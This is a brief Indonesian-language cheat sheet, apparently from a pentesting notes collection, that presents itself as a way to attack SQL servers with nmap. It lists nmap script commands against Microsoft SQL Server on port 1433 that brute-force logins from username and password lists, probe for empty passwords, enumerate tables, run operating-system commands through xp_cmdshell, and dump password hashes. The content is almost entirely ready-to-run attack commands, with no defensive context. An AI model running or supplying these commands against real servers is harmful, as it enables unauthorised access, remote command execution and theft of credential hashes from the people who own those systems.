# Nmap: Serang SQL
nmap dapat digunakan untuk melakukan serangan ke SQL

```
nmap -p1433 --script ms-sql-info 192.168.0.80
nmap -p1433 --script ms-sql-brute 192.168.0.80
nmap -p1433 --script ms-sql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt 192.168.0.80
nmap -p1433 --script ms-sql-empty-password 192.168.0.80
nmap -p1433 --script ms-sql-hasdbaccess.nse --script-args mssql.username=sa 192.168.0.80
nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa 192.168.0.80
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa 192.168.0.80
nmap -p1433 --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd='net users',mssql.username=sa 192.168.0.80
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa 192.168.0.80
```